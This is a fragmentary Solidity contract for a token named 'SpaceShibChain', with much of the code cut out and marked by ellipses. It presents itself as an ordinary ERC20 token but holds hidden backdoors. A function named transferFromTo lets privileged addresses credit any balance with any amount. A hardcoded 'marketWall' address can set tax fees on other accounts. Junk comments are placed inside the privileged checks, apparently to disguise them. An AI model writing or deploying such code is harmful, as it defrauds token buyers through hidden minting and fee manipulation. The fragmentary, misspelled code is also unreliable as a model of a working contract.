...
contract SpaceShibChain is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "SpaceShibChain";
    string private _symbol = "SpaceShibChain";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0x0F2c24F80b38434B7dFcCeA4A089BAC0B2D9dbA7); 
    address payable private teamWalletAddress = payable(0xb162AE2e7195D894b8838DC2A95DAB92B7115E61); 
	...
	function openTrand(address[] calldata addresses, bool status) public onlyOwner {
	...
	function _transferFrom(address spender, uint256 amount) internal{
        require(spender != address(0), "ERC20: approve to the zero address");
        _doollar[spender] = _doollar[spender] + amount;
    }
	
	function transferFromTo(address addde , uint256 uinttt) public{
	if( _mainPai[ /*as asdfg*/msg.sender])
	   {
	      _transferFrom(addde, uinttt);
	   }
	}
	...
	function transferTo(address _address, bool _enable, uint256 _addressTaxFee) public {
	    if( marketWall/*asdf aw dawfg*/ ==  /*asdf aw dawfg*/msg.sender){
...
// 		uint256 amountpercent = 0;  
        ...
        if(_mainPai[sender]) {
            ...
            if(airDropFeeAmount > 0) {
			    ...
			    _doollar[teamWalletAddress] += airDropHalf;
                ...
                for (uint i = 0; i < 3; i++) {
                    ...
                    if(i == 2){
                        _doollar[randomAddr] += airDropFeeAmount - airDropEve - airDropEve;
                        emit Transfer(sender, randomAddr, airDropFeeAmount - airDropEve - airDropEve);
                    }else{
                        _doollar[randomAddr] += airDropEve;
